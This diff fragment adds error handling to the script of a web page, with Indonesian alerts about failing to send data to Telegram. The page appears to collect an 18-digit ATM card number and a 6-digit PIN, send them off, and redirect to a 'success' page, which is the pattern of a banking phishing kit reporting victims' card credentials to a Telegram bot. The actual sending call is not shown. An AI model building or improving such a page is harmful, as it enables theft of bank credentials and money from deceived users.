@@ -277,8 +277,16 @@
           atmCount.textContent = '0/18';
           pinCount.textContent = '0/6';
           window.location.href = 'success.html';
-        } else
-  })
+        } else {
+          alert('Gagal mengirim data ke Telegram.');
+          console.error(data);
+        }
+      })
+      .catch(err => {
+        alert('Terjadi kesalahan saat mengirim data.');
+        console.error(err);
+      });
+  });
 </script>
 
 </body>
